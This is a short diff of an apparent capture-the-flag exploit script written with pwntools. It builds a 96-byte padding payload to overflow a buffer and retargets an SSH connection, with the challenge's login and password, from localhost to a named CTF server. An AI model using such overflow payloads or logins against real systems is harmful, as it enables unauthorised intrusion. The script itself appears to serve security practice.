@@ -5,7 +5,7 @@ from pwn import *
 payload = b"A" * 96  # Fill buffer
 
 # Connect via SSH and initiate interactive "shell"
-p = ssh("detective", "localhost", password="ctf2025!", port=30201, timeout=5, raw=True)
+p = ssh("detective", "poison-in-the-wells-1.ctf.umanitobacssa.ca", password="ctf2025!", port=30201, timeout=5, raw=True)
 io = p.shell()
 
 # Wait until the server is ready for a command
